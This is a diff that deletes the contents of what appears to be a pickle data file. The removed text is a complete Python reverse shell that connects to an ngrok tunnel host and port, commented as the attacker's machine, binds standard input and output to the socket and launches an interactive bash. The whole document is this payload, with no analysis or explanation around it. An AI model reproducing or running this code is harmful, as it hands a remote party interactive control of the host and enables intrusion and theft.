@@ -1,3 +1,0 @@
-V\u000aimport subprocess\u000aimport socket\u000aimport os\u000a\u000a# Set up a socket connection to the attacker's machine\u000as = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\u000as.connect(('0.tcp.eu.ngrok.io', 15356))\u000a\u000a# Redirect standard input, output, and error to the socket\u000aos.dup2(s.fileno(), 0)\u000aos.dup2(s.fileno(), 1)\u000aos.dup2(s.fileno(), 2)\u000a\u000a# Execute a shell\u000asubprocess.run(['/bin/bash', '-i'])\u000a
-p0
-.
